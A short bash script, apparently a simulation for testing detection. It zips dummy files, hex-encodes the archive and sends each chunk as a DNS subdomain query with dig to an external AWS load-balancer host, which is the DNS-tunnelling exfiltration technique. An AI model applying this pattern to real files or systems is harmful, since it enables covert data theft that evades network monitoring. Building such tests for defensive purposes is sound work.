#! /bin/bash

epoch=$(date +%s)
mkdir $epoch && cd $epoch || exit 1
for i in $(seq 1 10); do echo $i > $i.tmp; done
zip fakefile.zip *.tmp
rm *.tmp
xxd -p fakefile.zip > data
rm fakefile.zip
for dat in `cat data`; do dig $dat.legit.term01-b-449152202.us-west-1.elb.amazonaws.com; done
rm data
cd ..
rmdir $epoch